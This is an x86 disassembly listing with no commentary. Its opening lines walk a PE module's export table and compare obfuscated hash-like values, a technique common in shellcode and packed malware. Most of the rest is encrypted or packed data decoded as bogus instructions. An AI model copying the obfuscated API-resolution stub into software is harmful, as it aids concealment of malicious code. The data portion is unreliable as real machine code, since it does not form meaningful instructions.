  4192fc:	cmp    di,bx
  4192ff:	jne    0x419327
  419305:	movsx  di,BYTE PTR [eax]
  419309:	mov    ebx,0x3b4b
  41930e:	sub    di,bx
  419311:	mov    ebx,0x8a85
  419316:	xor    di,bx
  419319:	mov    ebx,0x4f87
  41931e:	cmp    di,bx
  419321:	je     0x419337
  419327:	mov    edi,DWORD PTR [ebp-0x10]
  41932a:	xor    edi,ecx
  41932c:	mov    ebx,esi
  41932e:	sub    ebx,edi
  419330:	add    eax,ebx
  419332:	jmp    0x4192e2
  419337:	mov    esi,DWORD PTR [ebp-0x14]
  41933a:	mov    esi,DWORD PTR [esi]
  41933c:	mov    edi,DWORD PTR [eax+0x3c]
  41933f:	lea    esi,[edi+esi*8+0x78]
  419343:	mov    esi,DWORD PTR [esi+eax*1]
  419346:	mov    DWORD PTR [ebp-0x8],esi
  419349:	mov    esi,DWORD PTR [ebp+0x8]
  41934c:	xor    esi,ecx
  41934e:	add    esi,edx
  419350:	mov    DWORD PTR [ebp-0x14],esi
  419353:	mov    esi,DWORD PTR [ebp+0x8]
  419356:	mov    edi,DWORD PTR [ebp-0x8]
  419359:	xor    esi,ecx
  41935b:	add    esi,edx
  41935d:	pop    ebx
  41935e:	cmp    edi,esi
  419360:	jne    0x41937e
  419366:	mov    eax,DWORD PTR [ebp+0xc]
  419369:	xor    eax,ecx
  41936b:	mov    ecx,DWORD PTR [ebp-0x8]
  41936e:	add    eax,edx
  419370:	imul   eax,ecx
  419373:	mov    DWORD PTR [ebp-0x8],eax
  419376:	push   DWORD PTR [ebp+0x18]
  419379:	jmp    0x41b78a
  41937e:	mov    ecx,DWORD PTR [ebp-0x8]
  419381:	add    ecx,eax
  419383:	jmp    0x41b73b
  419388:	dec    ebx
  419389:	cmp    al,0x60
  41938b:	or     DWORD PTR [edi],0x426c6b9d
  419391:	push   cs
  419392:	mov    ch,BYTE PTR [eax+edi*4+0x8]
  419396:	xchg   bh,ah
  419398:	fild   WORD PTR [ecx]
  41939a:	popa   
  41939b:	(bad)  
  41939c:	(bad)  
  41939d:	pop    edi
  41939e:	bound  esp,QWORD PTR [edx-0x6]
  4193a1:	les    edx,FWORD PTR [edi+0x21]
  4193a4:	xchg   edi,eax
  4193a5:	outs   dx,BYTE PTR ds:[esi]
  4193a6:	inc    esi
  4193a7:	aas    
  4193a8:	lods   al,BYTE PTR ds:[esi]
  4193a9:	and    BYTE PTR [eax+0x4d2924fb],ch
  4193af:	je     0x4193d9
  4193b1:	pushf  
  4193b2:	cld    
  4193b3:	xchg   esi,eax
  4193b4:	and    BYTE PTR [ebp-0x50],0x97
  4193b8:	adc    ebx,edi
  4193ba:	(bad)  
  4193bb:	push   esi
  4193bc:	add    eax,0x743c15b5
  4193c1:	sbb    DWORD PTR ds:[edi-0x78],edi
  4193c5:	jo     0x419394
  4193c7:	push   ecx
  4193c8:	cmp    cl,BYTE PTR [edx]
  4193ca:	out    0x41,al
  4193cc:	add    ebx,DWORD PTR [edx-0x75]
  4193cf:	pop    ebx
  4193d0:	mov    ds:0x809ba57d,al
  4193d5:	lahf   
  4193d6:	push   ds
  4193d7:	jp     0x419367
  4193d9:	mov    es,WORD PTR [edi-0x13]
  4193dc:	mov    bl,0x9c
  4193de:	add    al,0xd0
  4193e0:	lods   al,BYTE PTR ds:[esi]
  4193e1:	push   edi
  4193e2:	push   0xa08e3d0d
  4193e7:	push   edx
  4193e8:	push   0x3d29810b
  4193ed:	and    eax,0xc587526d
  4193f2:	fs out 0x60,eax
  4193f5:	(bad)
  4193f8:	je     0x41940a
  4193fa:	dec    ecx
  4193fb:	mov    ch,0xa2
  4193fd:	aad    0xa4
  4193ff:	outs   dx,DWORD PTR ds:[esi]
  419400:	outs   dx,DWORD PTR ds:[esi]
  419401:	pop    ds
  419402:	xchg   edi,eax
  419403:	mov    al,ds:0xdf3bc464
  419408:	scas   al,BYTE PTR es:[edi]
  419409:	pop    ds
  41940a:	cld    
  41940b:	sub    ebx,ebp
  41940d:	dec    eax
  41940e:	or     cl,BYTE PTR [edi+0x38]
  419411:	add    al,dl
  419413:	xchg   esi,eax
  419414:	mov    dl,0xac
  419416:	outs   dx,DWORD PTR ds:[esi]
  419417:	fidiv  DWORD PTR [ecx]
  419419:	sti    
  41941a:	sub    BYTE PTR [eax],dl
  41941c:	cmp    eax,0x85641d45
  419421:	xor    DWORD PTR [edi+0x23c34e31],edx
  419427:	stos   DWORD PTR es:[edi],eax
  419428:	retf   0xcfc6
  41942b:	push   ds
  41942c:	mov    es,WORD PTR [edi+0x9dcbe64]
  419432:	cmp    eax,0x6a1bfc2e
  419437:	add    eax,0xa038cc5c
  41943c:	and    BYTE PTR cs:[edi-0x31],0xc8
  419441:	mov    bl,0x8e
  419443:	lods   eax,DWORD PTR ds:[esi]
  419444:	xchg   esp,eax
  419445:	sbb    BYTE PTR [ebx],dh
  419447:	test   DWORD PTR ds:0x2e2c2b0f,0x2cfad3f6
  419451:	or     eax,0x382933cd
  419456:	inc    eax
  419457:	enter  0x57b4,0xea
  41945b:	jo     0x41946c
  41945d:	mov    ?,WORD PTR [esi-0x75]
  419460:	test   DWORD PTR [ecx+0x2992e194],eax
  419466:	outs   dx,BYTE PTR ds:[esi]
  419467:	idiv   BYTE PTR ds:0xf65ef9a1
  41946d:	inc    ebp
  41946e:	or     al,0x4c
  419470:	pop    ecx
  419471:	imul   esp,DWORD PTR ds:0xeca557d9,0xfffffffd
  419478:	or     BYTE PTR [ecx+edi*1-0x6],0x48
  41947d:	jg     0x419413
  41947f:	xor    BYTE PTR [ebp+0x58],dl
  419482:	aad    0x6c
  419484:	xchg   edi,eax
  419485:	inc    BYTE PTR [ebx]
  419487:	shl    DWORD PTR [edx-0x2d8e1c7d],1
  41948d:	xor    al,0x47
  41948f:	push   esi
  419490:	jns    0x419495
  419492:	pop    eax
  419493:	lock xchg esp,eax
  419495:	aaa    
  419496:	std    
  419497:	xchg   edx,eax
  419498:	clc    
  419499:	(bad)  
  41949b:	lahf   
  41949c:	add    bl,0xf7
  41949f:	mov    esp,0x4b172634
  4194a4:	push   eax
  4194a5:	adc    al,0xb0
  4194a7:	cdq    
  4194a8:	xchg   esp,eax
  4194a9:	push   edx
  4194aa:	call   0xb9e92d0e
  4194af:	jns    0x419513
  4194b1:	or     cl,ah
  4194b3:	retf   
  4194b4:	adc    ch,BYTE PTR [edi]
  4194b6:	inc    edx
  4194b7:	ror    DWORD PTR [ebp+0x65603d68],0x6e
  4194be:	int3   
  4194bf:	rcl    esi,1
  4194c1:	leave  
  4194c2:	pop    ss
  4194c3:	leave  
  4194c4:	xchg   esp,eax
  4194c5:	xchg   ebp,eax
  4194c6:	bound  ecx,QWORD PTR [edx]
  4194c8:	dec    ebx
  4194c9:	or     BYTE PTR [eax+ecx*8+0x26],cl
  4194cd:	jecxz  0x419517
  4194cf:	stos   DWORD PTR es:[edi],eax
  4194d0:	out    dx,eax
  4194d1:	inc    ecx
  4194d2:	ret    
  4194d3:	scas   eax,DWORD PTR es:[edi]
  4194d4:	pop    es
  4194d5:	push   ebp
  4194d6:	and    eax,0x814bb93f
  4194db:	daa    
  4194dc:	xor    DWORD PTR [esi+0x2e],eax
  4194df:	ja     0x4194af
  4194e1:	dec    edx
  4194e2:	jbe    0x41951e
  4194e4:	dec    edi
  4194e5:	inc    ecx
  4194e6:	jmp    0xc17437b4
  4194eb:	fwait
  4194ec:	adc    eax,0x386e1ac4
  4194f1:	ret    0x275f
  4194f4:	dec    ecx
  4194f5:	push   es
  4194f6:	jg     0x4194bc
  4194f8:	cmp    BYTE PTR [edi],ch
  4194fa:	pop    ecx
  4194fb:	sub    dh,cl
  4194fd:	dec    eax
  4194ff:	fcomp  QWORD PTR [ebp+0x6b]
  419502:	jl     0x41950f
  419504:	mov    bl,BYTE PTR [edi-0x3b]
  419507:	mov    ah,0x66
  419509:	stc    
  41950a:	cmp    cl,BYTE PTR [ebx-0x63b09989]
  419510:	(bad)  
  419511:	clc    
  419512:	retf   0x4e66
  419515:	stc    
  419516:	adc    BYTE PTR [edi+0x70],dl
  419519:	pop    ss
  41951a:	xchg   BYTE PTR [ecx*2-0x78ea9768],ah
  419521:	xor    DWORD PTR [ecx-0x6b91ed08],0xffffff88
  419528:	jp     0x4194ea
  41952a:	push   ss
  41952b:	push   ds
  41952c:	stc    
  41952d:	pop    ss
  41952e:	test   DWORD PTR [edi-0x9b66576],edi
  419534:	mov    ebp,0x503a6040
  419539:	sub    al,0x51
  41953b:	stc    
  41953c:	mov    ds:0xcb37a033,al
  419541:	out    0xc1,eax
  419543:	cmp    ecx,DWORD PTR [eax+0x35]
  419546:	scas   eax,DWORD PTR es:[edi]
  419547:	push   ebp
  419548:	ret    
  419549:	or     ebp,edx
  41954b:	mov    ?,WORD PTR [eax-0x60]
  41954e:	pop    ds
  41954f:	clc    
  419550:	(bad)  
  419552:	mov    ebp,DWORD PTR [edi-0x36ab2731]
  419558:	leave  
  419559:	push   edi
  41955a:	or     al,BYTE PTR [esi+0x2362902f]
  419560:	xor    eax,0x280989e7
  419565:	icebp  
  419566:	loope  0x4195a2
  419568:	adc    DWORD PTR [esi],esi
  41956a:	sbb    cl,0x7c
  41956d:	call   0xae45d8f8
  419572:	pop    eax
  419573:	js     0x41951b
  419575:	xor    eax,0x45db3300
  41957a:	or     edx,edi
  41957c:	sub    al,BYTE PTR [ebx+0xca2cfca]
  419582:	ret    
  419583:	or     esi,DWORD PTR [edx+eiz*2-0x49780f]
  41958a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41958b:	test   al,0xd3
  41958d:	jb     0x4195f0
  41958f:	adc    bl,bh
  419591:	pmaddwd mm3,QWORD PTR [esi+0x7aaca3b1]
  419598:	leave  
  419599:	je     0x41957a
  41959b:	stos   BYTE PTR es:[edi],al
  41959c:	aaa    
  41959d:	jmp    0x3346:0xd4454907
  4195a4:	or     BYTE PTR [ecx+0x6d2b052],cl
  4195aa:	fwait
  4195ab:	sbb    eax,0x75a0c4c3
  4195b0:	ins    BYTE PTR es:[edi],dx
  4195b1:	and    BYTE PTR [edx-0x49],ch
  4195b4:	jb     0x4195f4
  4195b6:	(bad)
  4195b9:	fdiv   QWORD PTR [ecx-0x78ccbf91]
  4195c0:	inc    ebx
  4195c1:	addr16 mov ds:0x4138,al
  4195c5:	jp     0x4195cc
  4195c7:	das    
  4195c8:	not    BYTE PTR [edi-0x18]
  4195cb:	add    dl,BYTE PTR [ebp+edx*4+0x771a190]
  4195d2:	(bad)  
  4195d3:	imul   ebx,esi,0xffffff92
  4195d6:	xchg   edx,eax
  4195d7:	sub    BYTE PTR [edi],0xbf
  4195da:	xchg   bl,bh
  4195dc:	jo     0x419596
  4195de:	shl    BYTE PTR [eax+0x6d9ff0b1],1
  4195e4:	mov    DWORD PTR [ebx],ecx
  4195e6:	pushf  
  4195e7:	nop
  4195e8:	ja     0x4195bb
  4195ea:	mov    esi,eax
  4195ec:	inc    ecx
  4195ed:	sub    edx,DWORD PTR [edx+0x661e5bb0]
  4195f3:	adc    DWORD PTR [esi+0x1edc6865],ebp
  4195f9:	sahf   
  4195fa:	pop    ds
  4195fb:	inc    eax
  4195fc:	sbb    BYTE PTR [edi-0x21],bh
  4195ff:	stos   DWORD PTR es:[edi],eax
  419600:	sahf   
  419601:	sbb    ebp,esp
  419603:	and    ecx,DWORD PTR [ebx]
  419605:	out    dx,eax
  419606:	call   0xea6c:0x66c6b7e3
  41960d:	inc    edi
  41960e:	aaa    
  41960f:	xchg   edi,eax
  419610:	clc    
  419611:	push   0x9bab5fcb
  419616:	push   esp
  419617:	out    dx,eax
  419618:	dec    edx
  419619:	popa   
  41961a:	(bad)  
  41961b:	cmp    bl,dh
  41961d:	scas   eax,DWORD PTR es:[edi]
  41961e:	sub    eax,0x4badcc52
  419623:	leave  
  419624:	popa   
  419625:	fbld   TBYTE PTR [eax]
  419627:	inc    edx
  419628:	rcr    DWORD PTR [esi+0x5c],cl
  41962b:	push   ss
  41962c:	and    edx,esp
  41962e:	lea    ecx,[edi]
  419630:	addr16 nop
  419632:	adc    ecx,edi
  419634:	jl     0x4195c8
  419636:	mov    cl,0x3a
  419638:	popf   
  419639:	dec    ebp
  41963a:	leave  
  41963b:	pop    es
  41963c:	test   al,0x41
  41963e:	push   cs
  41963f:	pop    ecx
  419640:	mov    edx,0x983a0a72
  419645:	mov    al,BYTE PTR [eax-0x1d]
  419648:	not    BYTE PTR ds:0xa781c7e4
  41964e:	mov    ch,0xdf
  419650:	aas    
  419651:	out    dx,al
  419652:	mov    ch,0x61
  419654:	pop    edi
  419655:	xchg   BYTE PTR [ebp+0x3],bh
  419658:	xor    edi,DWORD PTR [esi-0x5978f96c]
  41965e:	pop    esi
  41965f:	dec    eax
  419660:	xor    bl,ah
  419662:	and    dl,BYTE PTR [esi-0x2d476977]
  419668:	dec    ebp
  419669:	call   0x74a3:0x7d07dcdd
  419670:	in     eax,0xc5
  419672:	mov    al,0x9
  419674:	sub    BYTE PTR [bp+di-0x1c0f],ah
  419679:	mov    dl,dh
  41967b:	jl     0x419608
  41967d:	xor    al,0x60
  41967f:	ror    DWORD PTR [esp+ecx*1],0x28
  419683:	scas   al,BYTE PTR es:[edi]
  419684:	xchg   edx,eax
  419685:	mov    ?,eax
  419687:	pop    esp
  419688:	xor    DWORD PTR [esi-0x76],eax
  41968b:	(bad)  [ecx-0x4b]
  41968e:	call   0x8973:0x9630387
  419695:	sub    al,0xae
  419697:	es add eax,0x14d6c491
  41969d:	jmp    0x41969f
  41969f:	push   esp
  4196a0:	fcom   DWORD PTR [edx+0x74d215bb]
  4196a6:	or     DWORD PTR [edx],ebx
  4196a8:	pop    ds
  4196a9:	dec    si
  4196ab:	push   edx
  4196ac:	repz pop eax
  4196ae:	mov    bh,0x7a
  4196b0:	adc    bl,BYTE PTR [ebp-0x7d2cdb06]
  4196b6:	mov    ds:0x71210986,al
  4196bb:	jne    0x4196b8
  4196bd:	and    DWORD PTR [edi],ecx
  4196bf:	dec    ebp
  4196c0:	test   eax,0xe29dbd3
  4196c5:	in     eax,dx
  4196c6:	cmp    DWORD PTR [edi-0x43],esi
  4196c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196ca:	test   DWORD PTR [ecx+0x25],ecx
  4196cd:	push   0x37730989
  4196d2:	aad    0x94
  4196d4:	cwde   
  4196d5:	sahf   
  4196d6:	mov    ebp,0xb83a287f
  4196db:	hlt    
  4196dc:	mov    WORD PTR [edi],?
  4196de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4196df:	jmp    0x4196b7
  4196e1:	cmp    eax,0x26696cfe
  4196e6:	and    eax,0x1011f30d
  4196eb:	jge    0x419747
  4196ed:	jp     0x4196ee
  4196ef:	into   
  4196f0:	xchg   edx,eax
  4196f1:	imul   ecx,DWORD PTR ds:0x6445efc,0x1a
  4196f8:	adc    ecx,eax
  4196fa:	mov    cl,0xf2
  4196fc:	in     al,dx
  4196fd:	out    dx,eax
  4196fe:	or     eax,0x68c5ec74
  419703:	sbb    ebx,eax
  419705:	(bad)  
  419706:	stos   DWORD PTR es:[edi],eax
  419707:	push   edx
  419708:	(bad)  
  419709:	jnp    0x4196d7
  41970b:	mov    al,ds:0x47930586
  419710:	mov    gs,WORD PTR [edi+0x23cea357]
  419716:	xlat   BYTE PTR ds:[ebx]
  419717:	dec    BYTE PTR [edx+ebx*4+0x485dc40c]
  41971e:	inc    ebx
  41971f:	into   
  419720:	aas    
  419721:	dec    esp
  419722:	pop    edi
  419723:	pusha  
  419724:	pop    es
  419725:	out    0x73,al
  419727:	mov    ecx,0x700892cc
  41972c:	sub    BYTE PTR [eax-0x628c4191],cl
  419732:	cmp    DWORD PTR [edi],esp
  419734:	xchg   ebp,eax
  419735:	fdiv   QWORD PTR [eax-0x3c]
  419738:	push   ds
  419739:	and    dl,ch
  41973b:	sbb    ah,BYTE PTR [eax-0x6c]
  41973e:	jns    0x419708
  419740:	xor    BYTE PTR ds:0x159390f2,ah
  419746:	mov    bh,0x34
  419748:	pushf  
  419749:	or     BYTE PTR [edi],bh
  41974b:	pushf  
  41974c:	aaa    
  41974d:	outs   dx,BYTE PTR ds:[esi]
  41974e:	dec    edi
  41974f:	mov    ah,BYTE PTR [eax]
  419751:	js     0x41970b
  419753:	inc    eax
  419755:	inc    esp
  419756:	fisubr DWORD PTR [ebp-0x390470f7]
  41975c:	fwait
  41975d:	xchg   BYTE PTR [ebp-0x62],ah
  419760:	mov    ds:0x5c9c313b,eax
  419765:	std    
  419766:	ret    0xe1f1
  419769:	sub    BYTE PTR [eax],al
  41976b:	(bad)  
  41976c:	mov    ebx,0x5e2b77b7
  419771:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419772:	push   0xc4a5b31e
  419777:	adc    eax,0x704ad6d6
  41977c:	retf   
  41977d:	jnp    0x41975d
  41977f:	in     al,0x61
  419781:	sahf   
  419782:	int    0x71
  419784:	push   esp
  419785:	int3   
  419786:	mov    ?,esp
  419788:	scas   al,BYTE PTR es:[edi]
  419789:	jge    0x419774
  41978b:	mov    ecx,0x5db49039
  419790:	out    dx,al
  419791:	inc    esp
  419792:	pop    ecx
  419793:	and    eax,0x5a2fd475
  419798:	loope  0x419812
  41979a:	add    ch,BYTE PTR [ebp-0x6e]
  41979d:	push   ds
  41979e:	xor    al,0x93
  4197a0:	inc    edi
  4197a1:	in     al,0xe8
  4197a3:	cmp    eax,0x8ebc916f
  4197a8:	mov    eax,0x78e5e186
  4197ad:	repnz mov esi,0x2ab5bf90
  4197b3:	fs ins BYTE PTR es:[edi],dx
  4197b5:	dec    esi
  4197b6:	fst    QWORD PTR [ecx+0x12]
  4197b9:	add    DWORD PTR [edx-0x51],edi
  4197bc:	(bad)  
  4197bd:	into   
  4197be:	jg     0x41980c
  4197c0:	xor    al,0x84
  4197c2:	adc    al,0x95
  4197c5:	pop    ecx
  4197c6:	xchg   ebx,eax
  4197c7:	lock dec esp
  4197c9:	icebp  
  4197ca:	adc    BYTE PTR ds:0x94630c1d,ch
  4197d0:	fsub   QWORD PTR [edi]
  4197d2:	test   al,0xb8
  4197d4:	dec    eax
  4197d5:	xchg   ebx,eax
  4197d6:	add    eax,0xbf727b56
  4197db:	aad    0x3b
  4197dd:	loopne 0x419851
  4197df:	adc    al,BYTE PTR [esi-0x29]
  4197e2:	mov    ebp,DWORD PTR [eax]
  4197e4:	pop    ecx
  4197e5:	mov    ebp,0xe001ab40
  4197ea:	popa   
  4197eb:	popa   
  4197ec:	push   esp
  4197ed:	div    DWORD PTR [esi-0x76791e0f]
  4197f3:	aam    0x41
  4197f5:	fs setno bh
  4197f9:	sbb    eax,0x63243807
  4197fe:	sub    DWORD PTR [esi-0x39fb0c33],ecx
  419804:	sbb    BYTE PTR [ebx+0x75ed5c09],ah
  41980a:	fs rcr edi,cl
  41980d:	loop   0x419885
  41980f:	mov    esi,0xd151e5d7
  419814:	je     0x4197cd
  419816:	sahf   
  419817:	shl    ebx,1
  419819:	lock stos BYTE PTR es:[edi],al
  41981b:	nop
  41981c:	xchg   ecx,eax
  41981d:	pop    ebp
  41981e:	out    dx,al
  41981f:	or     DWORD PTR [bp+si],esp
  419822:	retf   
  419823:	cmp    eax,DWORD PTR ds:0x6e1667a1
  419829:	pop    edx
  41982a:	or     edx,DWORD PTR [ecx+0x5368a748]
  419830:	(bad)  
  419831:	(bad)  
  419832:	cs mov esi,0x20f5f551
  419838:	cmp    al,0x77
  41983a:	jmp    eax
  41983c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41983d:	shl    ch,cl
  41983f:	icebp  
  419840:	xlat   BYTE PTR ds:[ebx]
  419841:	imul   esi,esi,0x379e17a5
  419847:	popa   
  419848:	popf   
  419849:	push   edi
  41984a:	sub    al,BYTE PTR [eax+0x2]
  41984d:	sbb    DWORD PTR [edi-0x64663def],0x3fd5796f
  419857:	and    DWORD PTR [eax+0x74],ebp
  41985a:	es mov ah,cl
  41985d:	xchg   ecx,eax
  41985e:	push   ds
  41985f:	pop    ebp
  419860:	shl    edx,1
  419862:	retf   
  419863:	push   ecx
  419864:	scas   al,BYTE PTR es:[edi]
  419865:	inc    ebp
  419866:	call   0xd97e:0xad1e6b65
  41986d:	mov    BYTE PTR [edx-0x289a854b],bl
  419873:	shl    DWORD PTR [esi],cl
  419875:	cdq    
  419876:	push   ecx
  419877:	mov    BYTE PTR [ecx],al
  419879:	sti    
  41987a:	push   edx
  41987b:	ins    BYTE PTR es:[edi],dx
  41987c:	push   esp
  41987d:	lahf   
  41987e:	sbb    al,0xed
  419880:	inc    esi
  419881:	daa    
  419882:	jno    0x41980e
  419884:	dec    ebp
  419885:	push   cs
  419886:	push   cs
  419887:	mov    al,0xa2
  419889:	(bad)
  41988c:	arpl   WORD PTR [eax],sp
  41988e:	pushf  
  41988f:	out    0x91,al
  419891:	mov    WORD PTR [ebp+0x24],?
  419894:	push   ss
  419895:	(bad)  
  419896:	inc    eax
  419897:	lds    ebp,FWORD PTR [ebx-0x686cb4a2]
  41989d:	xor    ecx,DWORD PTR [ebp+0x31]
  4198a0:	push   cs
  4198a1:	adc    eax,0xcd0e3eb5
  4198a6:	or     eax,0x6652c223
  4198ab:	mov    BYTE PTR [eax],bh
  4198ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198ae:	xchg   edi,eax
  4198af:	in     eax,dx
  4198b0:	outs   dx,DWORD PTR ds:[esi]
  4198b2:	ja     0x4198aa
  4198b4:	lahf   
  4198b5:	outs   dx,BYTE PTR ds:[esi]
  4198b6:	jge    0x4198d0
  4198b8:	mov    ds:0xc7258ee7,eax
  4198bd:	pushf  
  4198be:	cmp    edx,DWORD PTR [ebx]
  4198c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198c1:	cdq    
  4198c2:	inc    ecx
  4198c3:	fwait
  4198c4:	les    edi,FWORD PTR [ebx+0xda17277]
  4198ca:	xlat   BYTE PTR ds:[ebx]
  4198cb:	push   edi
  4198cc:	inc    esp
  4198cd:	mov    bl,0xeb
  4198cf:	mov    ah,0x89
  4198d1:	mov    ch,0xdd
  4198d3:	pushf  
  4198d4:	mov    ah,al
  4198d6:	and    bh,cl
  4198d8:	dec    eax
  4198d9:	pop    eax
  4198da:	add    ebp,DWORD PTR ds:0x4fabcba3
  4198e0:	mov    al,ds:0xcccfbcfa
  4198e5:	sub    ebx,ebp
  4198e7:	scas   al,BYTE PTR es:[edi]
  4198e8:	cli    
  4198e9:	adc    bh,0xc9
  4198ec:	xchg   cl,bh
  4198ee:	sub    ecx,esi
  4198f0:	iret   
  4198f1:	and    al,0x37
  4198f3:	add    DWORD PTR [ebp-0x5c],edi
  4198f6:	adc    al,0x40
  4198f8:	or     eax,0xa1a98909
  4198fd:	popf   
  4198fe:	mov    ah,0x9
  419900:	in     al,dx
  419901:	outs   dx,DWORD PTR ds:[esi]
  419902:	fdivr  QWORD PTR [ebx-0x48ed5467]
  419908:	ja     0x419898
  41990a:	and    DWORD PTR [ecx-0x40a7970e],esp
  419910:	pushf  
  419911:	outs   dx,DWORD PTR ds:[esi]
  419912:	(bad)  
  419913:	ins    BYTE PTR es:[edi],dx
  419914:	imul   edi,DWORD PTR [eax+0x574e03e8],0x2b879f6d
  41991e:	test   al,0xe
  419920:	push   ebx
  419921:	and    eax,0x22a2edeb
  419926:	or     ah,ch
  419928:	daa    
  419929:	jmp    0x1dbb:0xb977a4d3
  419930:	bound  ebp,QWORD PTR [esi]
  419932:	pop    ebp
  419933:	xchg   esp,eax
  419934:	xlat   BYTE PTR ds:[ebx]
  419935:	jo     0x4198ee
  419937:	or     DWORD PTR [eax+0x3d215684],ebx
  41993d:	push   esi
  41993e:	push   ss
  41993f:	pop    edx
  419940:	cli    
  419941:	jg     0x4198f1
  419943:	and    al,0x2b
  419945:	pop    edi
  419946:	(bad)  
  419947:	ins    BYTE PTR es:[edi],dx
  419948:	adc    ebp,DWORD PTR [edx-0x63562c37]
  41994e:	mov    dl,0xef
  419950:	mov    ah,0xdf
  419952:	mov    DWORD PTR [esi+0x2c],ebp
  419955:	(bad)  
  419956:	pop    ebx
  419957:	int    0xc2
  419959:	mov    ebx,0x82fad969
  41995e:	dec    ebp
  41995f:	mov    eax,DWORD PTR [ebx+eax*2]
  419962:	retf   0xc943
  419965:	lods   al,BYTE PTR ds:[esi]
  419966:	clc    
  419967:	lods   eax,DWORD PTR ds:[esi]
  419968:	ins    BYTE PTR es:[edi],dx
  419969:	(bad)  [edi+edx*2]
  41996c:	ss dec ebx
  41996e:	or     DWORD PTR [ebp-0x3e],ecx
  419971:	pop    esp
  419972:	pop    ss
  419973:	stos   DWORD PTR es:[edi],eax
  419974:	gs and al,0xc0
  419977:	dec    ebx
  419978:	adc    al,0x77
  41997a:	xchg   esi,eax
  41997b:	gs or  al,0xae
  41997e:	test   ebx,edi
  419980:	push   edx
  419981:	cmp    al,0xd7
  419983:	mov    eax,ds:0x454fc57a
  419988:	inc    esp
  419989:	dec    ebp
  41998a:	pop    es
  41998b:	add    eax,0xe690f611
  419990:	pop    ecx
  419991:	fstp   TBYTE PTR [ebx-0x9]
  419994:	pop    es
  419995:	mov    ebp,0xffbec3b7
  41999a:	test   DWORD PTR [ecx+0x5d2bdd1d],0x35c83da8
  4199a4:	push   0x731defab
  4199a9:	mov    ch,0x6e
  4199ab:	les    edi,FWORD PTR [edi+esi*1-0x5a4cca42]
  4199b2:	jno    0x41997e
  4199b4:	or     ebp,edx
  4199b6:	fsubr  DWORD PTR [edi]
  4199b8:	lahf   
  4199b9:	(bad)  
  4199ba:	into   
  4199bb:	dec    ebp
  4199bc:	pusha  
  4199bd:	ret    
  4199be:	test   eax,0xa7673086
  4199c3:	scas   al,BYTE PTR es:[edi]
  4199c4:	mov    al,BYTE PTR [eax+0x3dce5549]
  4199ca:	popa   
  4199cb:	(bad)  
  4199cc:	fmul   DWORD PTR [esi-0x1cb9ea10]
  4199d2:	add    ebx,esi
  4199d4:	in     eax,dx
  4199d5:	sbb    ebx,ecx
  4199d7:	loop   0x419a02
  4199d9:	push   edx
  4199da:	(bad)  
  4199db:	sti    
  4199dc:	lods   eax,DWORD PTR ds:[si]
  4199de:	push   0x145c2419
  4199e3:	sub    BYTE PTR [edx],bl
  4199e5:	push   es
  4199e6:	cli    
  4199e7:	and    bh,BYTE PTR [ebx+0x3c56ed09]
  4199ed:	fimul  WORD PTR [edi-0x65]
  4199f0:	lods   al,BYTE PTR ds:[esi]
  4199f1:	shl    BYTE PTR [esi+0x29f5bd75],0x3f
  4199f8:	cmc    
  4199f9:	imul   edi,DWORD PTR [edi+0x23],0x8adab3bd
  419a00:	mov    edx,0xc58f8f5a
  419a05:	jno    0x419a1c
  419a07:	pop    ds
  419a08:	repnz mov ch,0x5e
  419a0b:	dec    esi
  419a0c:	hlt    
  419a0d:	adc    al,bl
  419a0f:	dec    esi
  419a10:	(bad)  
  419a11:	mov    ch,0x93
  419a13:	jmp    0x4199dc
  419a15:	dec    esi
  419a16:	jg     0x419a46
  419a18:	jp     0x419a6e
  419a1a:	in     eax,dx
  419a1b:	mov    ds:0xf098ef3a,al
  419a20:	cld    
  419a21:	(bad)  
  419a22:	cs popa 
  419a24:	call   0xcdb1:0x180d477f
  419a2b:	iret   
  419a2c:	ficom  WORD PTR [edx-0x6a5f96c1]
  419a32:	xchg   ebx,eax
  419a33:	pop    ecx
  419a34:	jg     0x419a45
  419a36:	mov    ebx,0xc8330493
  419a3b:	rcl    BYTE PTR [ebx+0x415b36ce],1
  419a41:	or     BYTE PTR [edx],al
  419a43:	nop
  419a44:	in     eax,dx
  419a45:	test   BYTE PTR [ebp-0x47],cl
  419a48:	jge    0x419ab1
  419a4a:	mov    al,0x54
  419a4c:	mov    esi,0x9f86be66
  419a51:	aas    
  419a52:	and    eax,0x27c89c9d
  419a57:	cwde   
  419a58:	adc    dh,BYTE PTR [ecx+0x2b]
  419a5b:	push   0xffffff8c
  419a5d:	lahf   
  419a5e:	mov    dl,BYTE PTR [ecx+0x7]
  419a61:	or     bl,BYTE PTR [esi+0x7]
  419a64:	outs   dx,BYTE PTR ds:[esi]
  419a65:	dec    edx
  419a66:	mov    edi,0x2306e12b
  419a6b:	mov    ch,0xea
  419a6d:	imul   ebx,DWORD PTR [edx],0xf07d3d7e
  419a73:	jp     0x419a2f
  419a75:	xor    eax,0x9e9de4a3
  419a7a:	xchg   edx,eax
  419a7b:	xor    ebp,DWORD PTR [esi-0x1b2abcb9]
  419a81:	es jmp 0x718a:0x8d13428b
  419a89:	xchg   ebx,eax
  419a8a:	cld    
  419a8b:	mov    ch,0x1e
  419a8d:	xchg   BYTE PTR [esi-0x28141c9f],dl
  419a93:	ss add al,0x24
  419a96:	push   edx
  419a97:	add    DWORD PTR [esi-0x57],edx
  419a9a:	rol    DWORD PTR [edx-0x3c],0xff
  419a9e:	mul    BYTE PTR [edx]
  419aa0:	cld    
  419aa1:	mov    bh,0x74
  419aa3:	(bad)  
  419aa4:	push   esi
  419aa5:	jp     0x419b05
  419aa7:	mov    cl,0x75
  419aa9:	cmp    al,cl
  419aab:	not    BYTE PTR [ebp-0x52]
  419aae:	jbe    0x419b03
  419ab0:	pop    ss
  419ab1:	or     ebp,eax
  419ab3:	sub    al,0xe
  419ab5:	xor    dl,BYTE PTR [ecx]
  419ab7:	cmp    bl,BYTE PTR [edi+0x641b3690]
  419abd:	and    edx,0xffffff8b
  419ac0:	shl    bh,0xfa
  419ac3:	sti    
  419ac4:	push   0xffffffd4
  419ac6:	mov    ds,WORD PTR [ebx]
  419ac8:	dec    esi
  419ac9:	ss push esi
  419acb:	mov    ?,WORD PTR [ecx+0x5a454898]
